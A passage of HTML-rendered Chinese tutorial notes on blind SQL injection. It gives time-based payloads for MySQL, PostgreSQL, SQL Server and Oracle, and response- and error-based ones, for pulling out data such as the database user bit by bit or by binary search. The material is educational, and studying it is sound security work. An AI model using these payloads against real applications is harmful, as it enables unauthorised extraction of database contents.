punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>通常<code>'root'</code>写成16进制0x726f6f74（只编码了root），只用可以去掉单引号</p>\n<ul>\n<li><p>二分法</p>\n<p>依然是两种状态，延迟和未延迟</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">' <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">IF</span> <span class=\"token punctuation\">(</span>ASCII<span class=\"token punctuation\">(</span>SUBSTRING<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>……<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&gt;</span>k<span class=\"token punctuation\">,</span>SLEEP<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">' <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">IF</span> <span class=\"token punctuation\">(</span>ASCII<span class=\"token punctuation\">(</span>SUBSTRING<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>……<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&gt;</span>k<span class=\"token punctuation\">,</span>benchmark<span class=\"token punctuation\">(</span><span class=\"token number\">100000000</span><span class=\"token punctuation\">,</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>k是二分中间值</p>\n</li>\n<li><p>逐位</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token string\">' UNION SELECT IF (ASCII (SUBSTRING ((……), i, 1))&amp;2^j =2^j,SLEEP(1), 1) # \n'</span> <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">IF</span> <span class=\"token punctuation\">(</span>ASCII <span class=\"token punctuation\">(</span>SUBSTRING <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>……<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>j <span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>j<span class=\"token punctuation\">,</span>BENCHMARK<span class=\"token punctuation\">(</span><span class=\"token number\">100000000</span><span class=\"token punctuation\">,</span> RAND<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></li>\n</ul>\n<p>一部分注入在where字句中，这时延迟会在匹配表中每一行都会执行一次，时间会很长</p>\n<h5 id=\"PostgreSQL延迟技术\"><a href=\"#PostgreSQL延迟技术\" class=\"headerlink\" title=\"PostgreSQL延迟技术\"></a>PostgreSQL延迟技术</h5><p>8.1或者更低的版本，使用系统库的sleep()函数创建一个函数</p>\n<p>8.2及更高的版本，不是用sleep，提供了一个函数<code>pg_sleep()</code>，默认安装，返回值是void，不能直接放在where子句中</p>\n<p>解决方法，PostgreSQL能使用堆叠查询，第二个查询返回void，将由当前正在执行的应用程序进行处理，这会导致一个错误，当前程序将会失败，添加第三个哑查询，返回正确数量的列。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> reviews <span class=\"token keyword\">WHERE</span> review_author<span class=\"token operator\">=</span><span class=\"token string\">'MadBob'</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">CASE</span> <span class=\"token number\">1</span> <span class=\"token keyword\">WHEN</span> <span class=\"token number\">1</span> <span class=\"token keyword\">THEN</span> pg_sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">END</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">SELECT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">NULL</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>另一种解决方法，如果拥有创建PL/pgSQL函数的权限，可以创建一个新函数来封装pg_sleep()，并使它的返回值不为void，这样就能替代pg_sleep()，数据库拥有者必须为每个数据库单独启用PL/pgSQL语言。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">LANGUAGE</span> <span class=\"token string\">'plpgsql'</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">-- 启用PL/pgSQL</span>\n<span class=\"token comment\">-- 定义一个封装函数pause()</span>\n<span class=\"token keyword\">CREATE</span> <span class=\"token operator\">OR</span> <span class=\"token keyword\">REPLACE</span> <span class=\"token keyword\">FUNCTION</span> pause<span class=\"token punctuation\">(</span><span class=\"token keyword\">integer</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">RETURNS</span> <span class=\"token keyword\">integer</span> <span class=\"token keyword\">AS</span> $$\n<span class=\"token keyword\">DECLARE</span>\nwait alias <span class=\"token keyword\">for</span> $<span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">BEGIN</span>\nPERFORM pg_sleep<span class=\"token punctuation\">(</span>wait<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">RETURN</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">END</span><span class=\"token punctuation\">;</span>\n$$ <span class=\"token keyword\">LANGUAGE</span> <span class=\"token string\">'plpgsql'</span> STRICT<span class=\"token punctuation\">;</span>\n<span class=\"token comment\">-- 调用</span>\nxxx<span class=\"token punctuation\">.</span>php?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">CASE</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> usename <span class=\"token keyword\">FROM</span> pg_user <span class=\"token keyword\">WHERE</span> usesuper <span class=\"token operator\">IS</span> <span class=\"token boolean\">TRUE</span> <span class=\"token operator\">and</span> <span class=\"token keyword\">current_user</span><span class=\"token operator\">=</span>usename<span class=\"token punctuation\">)</span> <span class=\"token keyword\">WHEN</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">user</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">THEN</span> PAUSE<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">ELSE</span> <span class=\"token number\">1</span> <span class=\"token keyword\">END</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li><p>二分法</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token string\">';SELECT CASE WHEN (ASCII (SUBSTR (..., i,1)) &gt; k) THEN pg_sleep(1) END; SELECT NULL,...,NULL;-- \n'</span><span class=\"token operator\">||</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">CASE</span> <span class=\"token keyword\">WHEN</span> <span class=\"token punctuation\">(</span>ASCII<span class=\"token punctuation\">(</span>SUBSTR<span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;</span> k<span class=\"token punctuation\">)</span> <span class=\"token keyword\">THEN</span> PAUSE <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">ELSE</span> <span class=\"token number\">1</span> <span class=\"token keyword\">END</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">-- </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n</li>\n<li><p>逐位</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token string\">';SELECT CASE WHEN (ASCII (SUBSTR (...,i,1)) &amp;2^j=2^j) THEN pg_sleep(1) END; SELECT NULL,...,NULL;\n'</span><span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">CASE</span> <span class=\"token keyword\">WHEN</span> <span class=\"token punctuation\">(</span>ASCII <span class=\"token punctuation\">(</span>SUBSTR<span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>j<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>j<span class=\"token punctuation\">)</span> <span class=\"token keyword\">THEN</span> PAUSE <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">ELSE</span> <span class=\"token number\">1</span> <span class=\"token keyword\">END</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">-- </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></li>\n</ul>\n<h5 id=\"SQL-Server延迟\"><a href=\"#SQL-Server延迟\" class=\"headerlink\" title=\"SQL Server延迟\"></a>SQL Server延迟</h5><p><code>waitfor delay '00:01:00'</code>将正常执行时间增加1分钟，waitfor delay不能在where子句中使用，能使用堆叠查询</p>\n<p>SQL server驱动程序会把第一个查询输出返回给正在执行处理的程序，分号前面的会返回给后面的语句</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token function\">COUNT</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> reviews <span class=\"token keyword\">WHERE</span> review_author<span class=\"token operator\">=</span><span class=\"token string\">'MadBob'</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">IF</span> <span class=\"token keyword\">SYSTEM_USER</span><span class=\"token operator\">=</span><span class=\"token string\">'sa'</span> <span class=\"token keyword\">WAITFOR</span> DELAY <span class=\"token string\">'00:00:05'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>如果用户名为sa，返回时间就大于5秒</p>\n<p>还有一种新技术，该技术使用两个通过逻辑“与”隔开的子查询，其中一个子查询的执行时间为很多秒，另一个子查询包含一个推断检查。如果检查失败(第x位为0)，第二个子查询将返回，第一个子查询则因受“与”子句的影响而提前中止。实际结果是，如果正在推断的位为1，那么请求将花费比位为0时更多的时间。（其他数据库通用）<a href=\"https://archive.codeplex.com/?p=marathontool\">Marathon Tool - CodePlex Archive</a></p>\n<ul>\n<li><p>二分法</p>\n</li>\n<li><pre><code class=\"sql\">;IF ASCII(SUBSTRING((...),i,1))&gt;k WAITFOR DELAY '00:00:05';-- \n<pre class=\"line-numbers language-none\"><code class=\"language-none\">\n- 逐位\n\n  ```sql\n  ;IF ASCII (SUBSTRING ((...),i,1))&amp;2^j=2^j WAITFOR DELAY '00:00:05';--<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</code></pre>\n</li>\n</ul>\n<h5 id=\"Oracle延迟\"><a href=\"#Oracle延迟\" class=\"headerlink\" title=\"Oracle延迟\"></a>Oracle延迟</h5><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">BEGIN</span> DBMS_LOCK<span class=\"token punctuation\">.</span>SLEEP<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">END</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>oralce中许多SQL注入都指向DBMS_LOCK包，并且这个包必须在管理员下使用，同时oracle不支持堆叠查询，所以sleep(n)在SQL语句中不好利用</p>\n<p>如果注入点位于PL/SQL块中，则能利用</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">IF</span> <span class=\"token punctuation\">(</span>BITAND<span class=\"token punctuation\">(</span>ASCII<span class=\"token punctuation\">(</span>SUBSTR<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>j<span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>j<span class=\"token punctuation\">)</span> <span class=\"token keyword\">THEN</span> DBMS_LOCK<span class=\"token punctuation\">.</span>SLEEP<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">END</span> <span class=\"token keyword\">IF</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>使用DBMS_PIPE.RECEIVE_MESSAGE函数可以实现基于时间的 攻击</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">xxx<span class=\"token punctuation\">.</span>aspx?test<span class=\"token operator\">=</span>test<span class=\"token string\">'OR 1 = CASE WHEN\nSYS_CONTEXT('</span>USERENV<span class=\"token string\">', '</span>ISDBA<span class=\"token string\">') = '</span><span class=\"token boolean\">TRUE</span><span class=\"token string\">' THEN DBMS_PIPE.RECEIVE_ MESSAGE('</span>foo'<span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">ELSE</span> <span class=\"token number\">1</span> <span class=\"token keyword\">END</span> <span class=\"token comment\">-- </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h4 id=\"基于时间的推断应考虑的问题\"><a href=\"#基于时间的推断应考虑的问题\" class=\"headerlink\" title=\"基于时间的推断应考虑的问题\"></a>基于时间的推断应考虑的问题</h4><p>如果请求延迟很久，也可能是过载过高或者信道拥堵</p>\n<p>解决方法</p>\n<ol>\n<li>将延迟尽量设置高些以抵消其他延迟</li>\n<li>发送两个几乎相同的请求，比较两个延迟，一个可能是状态为0的延迟，一个是状态为1的延迟，加以推断</li>\n</ol>\n<h3 id=\"使用基于响应的请求\"><a href=\"#使用基于响应的请求\" class=\"headerlink\" title=\"使用基于响应的请求\"></a>使用基于响应的请求</h3><p>推断状态时，可以借助响应中包含的文本或在检查特定值时强制产生的错误。</p>\n<h4 id=\"Mysql响应技术\"><a href=\"#Mysql响应技术\" class=\"headerlink\" title=\"Mysql响应技术\"></a>Mysql响应技术</h4><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token function\">COUNT</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> reviews <span class=\"token keyword\">WHERE</span> review_author<span class=\"token operator\">=</span><span class=\"token string\">'MadBob'</span>\n<span class=\"token comment\">#返回两条结果</span>\n\n<span class=\"token keyword\">SELECT</span> <span class=\"token function\">COUNT</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> reviews <span class=\"token keyword\">WHERE</span> review_author<span class=\"token operator\">=</span><span class=\"token string\">'MadBob'</span> <span class=\"token operator\">AND</span> ASCII<span class=\"token punctuation\">(</span>SUBSTRING<span class=\"token punctuation\">(</span><span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>J<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>J<span class=\"token comment\">#</span>\n<span class=\"token comment\">#如果i位为1，条件为真，返回上面相同结果，i位为0则返回0条</span>\n\n<span class=\"token comment\">#平衡拆分技术</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token function\">COUNT</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> reviews <span class=\"token keyword\">WHERE</span> id<span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token comment\">#逐位方法(bit-by-bit)的拆分与平衡注入字符串为：</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token function\">COUNT</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> reviews <span class=\"token keyword\">WHERE</span> id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">+</span><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>ASCII<span class=\"token punctuation\">(</span>SUBSTRING<span class=\"token punctuation\">(</span><span class=\"token keyword\">CURRENT_USER</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>j<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>j<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#无法修改</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token function\">COUNT</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> reviews <span class=\"token keyword\">WHERE</span> id<span class=\"token operator\">=</span><span class=\"token keyword\">IF</span><span class=\"token punctuation\">(</span>ASCII<span class=\"token punctuation\">(</span>SUBSTRING<span class=\"token punctuation\">(</span><span class=\"token keyword\">CURRENT_USER</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>j<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>j<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> table_name <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> <span class=\"token keyword\">WHERE</span> table_name <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> table_name <span class=\"token keyword\">FROM</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">#很明显，第二个子查询返回多行，这句SQL会报错，那么就会有两种状态</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>使用以PHP编写并以MySQL作为数据存储的应用时，在数据库查询执行过程中出现的错误不会产生引发通用错误页面的异常。调用页面必须检查mysql_query()是否返回FALSE,或者mysql_error()是否返回一个非空字符串。只要有一个条件成立，页面就会打印一个应用专用的错误消息。这样做的结果是，MySQL错误不会产生HTTP 500响应代码，而是 产生正常的200响应代码。</p>\n<h4 id=\"PostgreSQL响应技术\"><a href=\"#PostgreSQL响应技术\" class=\"headerlink\" title=\"PostgreSQL响应技术\"></a>PostgreSQL响应技术</h4><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token function\">COUNT</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> reviews <span class=\"token keyword\">WHERE</span> review_author<span class=\"token operator\">=</span><span class=\"token string\">'MadBob'</span> <span class=\"token operator\">AND</span> ASCII<span class=\"token punctuation\">(</span>SUBSTRING<span class=\"token punctuation\">(</span><span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>j<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>j<span class=\"token comment\">-- </span>\n\n<span class=\"token keyword\">SELECT</span> <span class=\"token function\">COUNT</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> reviews <span class=\"token keyword\">WHERE</span> id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">CASE</span> <span class=\"token keyword\">WHEN</span> <span class=\"token punctuation\">(</span>ASCII<span class=\"token punctuation\">(</span>SUBSTR<span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>j<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>j<span class=\"token punctuation\">)</span> <span class=\"token keyword\">THEN</span> PAUSE <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">ELSE</span> <span class=\"token number\">0</span> <span class=\"token keyword\">END</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">--    </span>\n<span class=\"token comment\">#pause()是自定义的                                          </span>\n<span class=\"token comment\">#无法修改内容时，强制使用除以0的条件</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">CASE</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">WHEN</span> <span class=\"token boolean\">TRUE</span> <span class=\"token keyword\">THEN</span> <span class=\"token number\">1</span><span class=\"token operator\">/</span><span class=\"token number\">0</span> <span class=\"token keyword\">END</span>\n<span class=\"token comment\">#很容易将它和拆分与平衡技术结合使用：</span>\n<span class=\"token string\">'||(SELECT CASE(...)WHEN TRUE THEN 1/0 END)||'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"SQL-Server响应技术\"><a href=\"#SQL-Server响应技术\" class=\"headerlink\" title=\"SQL Server响应技术\"></a>SQL Server响应技术</h4><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token function\">COUNT</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> reviews <span class=\"token keyword\">WHERE</span> review_author<span class=\"token operator\">=</span><span class=\"token string\">'MadBob'</span> <span class=\"token operator\">and</span> <span class=\"token keyword\">SYSTEM_USER</span><span class=\"token operator\">=</span><span class=\"token string\">'sa'</span>\n\n<span class=\"token keyword\">SELECT</span> <span class=\"token function\">COUNT</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> reviews <span class=\"token keyword\">WHERE</span> review_author<span class=\"token operator\">=</span><span class=\"token string\">'MadBob'</span> <span class=\"token operator\">AND</span> ASCII<span class=\"token punctuation\">(</span>SUBSTRING<span class=\"token punctuation\">(</span><span class=\"token keyword\">SYSTEM_USER</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&gt;</span>k <span class=\"token comment\">-- </span>\n\n<span class=\"token keyword\">SELECT</span> <span class=\"token function\">COUNT</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> reviews <span class=\"token keyword\">WHERE</span> review_author<span class=\"token operator\">=</span><span class=\"token string\">'MadBob'</span> <span class=\"token operator\">AND</span> ASCII<span class=\"token punctuation\">(</span>SUBSTRING<span class=\"token punctuation\">(</span><span class=\"token keyword\">SYSTEM_USER</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>J<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>J\n\n<span class=\"token comment\">#二分法</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token function\">COUNT</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> reviews <span class=\"token keyword\">WHERE</span> review_author<span class=\"token operator\">=</span><span class=\"token string\">'Mad'</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">CASE</span> <span class=\"token keyword\">WHEN</span> ASCII<span class=\"token punctuation\">(</span>SUBSTRING<span class=\"token punctuation\">(</span><span class=\"token keyword\">SYSTEM_USER</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&gt;</span>k <span class=\"token keyword\">THEN</span> <span class=\"token string\">'Bob'</span> <span class=\"token keyword\">END</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">''</span>\n<span class=\"token comment\">#下面是相应的使用逐位方法的例子</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token function\">COUNT</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> reviews <span class=\"token keyword\">WHERE</span> review_author<span class=\"token operator\">=</span><span class=\"token string\">'Mad'</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">CASE</span> <span class=\"token keyword\">WHEN</span> ASCII<span class=\"token punctuation\">(</span>SUBSTRING<span class=\"token punctuation\">(</span><span class=\"token keyword\">SYSTEM_USER</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>j<span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>j <span class=\"token keyword\">THEN</span> <span class=\"token string\">'Bob'</span> <span class=\"token keyword\">END</span><span class=\"token 